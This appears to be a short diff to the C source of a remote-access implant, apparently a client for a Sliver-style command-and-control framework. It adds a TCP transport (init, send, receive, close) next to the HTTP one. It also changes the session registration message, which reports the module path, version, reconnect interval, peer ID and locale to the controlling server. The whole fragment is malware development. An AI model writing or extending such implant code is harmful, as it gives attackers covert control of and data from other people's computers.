@@ -20,6 +20,12 @@ PSLIVER_SESSION_CLIENT SessionInit
 	pSessionClient->Close = HttpClose;
 	pSessionClient->Cleanup = HttpCleanup;
 #else
+	pSessionClient->Init = (CLIENT_INIT)TcpInit;
+	pSessionClient->Start = TcpStart;
+	pSessionClient->Send = TcpSend;
+	pSessionClient->Receive = TcpRecv;
+	pSessionClient->Close = TcpClose;
+	pSessionClient->Cleanup = TcpCleanup;
 #endif
 
 CLEANUP:
@@ -127,7 +133,7 @@ BOOL SessionRegister
 	ElementList[9] = CreateBytesElement(lpModulePath, lstrlenA(lpModulePath), 10);
 	ElementList[11] = CreateBytesElement(lpVersion, lstrlenA(lpVersion), 12);
 	ElementList[12] = CreateVarIntElement(pSession->pGlobalConfig->dwReconnectInterval, 13);
-	ElementList[15] = CreateBytesElement(pSession->pGlobalConfig->szConfigID, lstrlenA(pSession->pGlobalConfig->szConfigID), 16);
+	ElementList[15] = CreateBytesElement(pSession->pGlobalConfig->lpConfigID, lstrlenA(pSession->pGlobalConfig->lpConfigID), 16);
 	ElementList[16] = CreateVarIntElement(pSession->pGlobalConfig->uPeerID, 17);
 	ElementList[17] = CreateBytesElement(lpLocaleName, lstrlenA(lpLocaleName), 18);
 
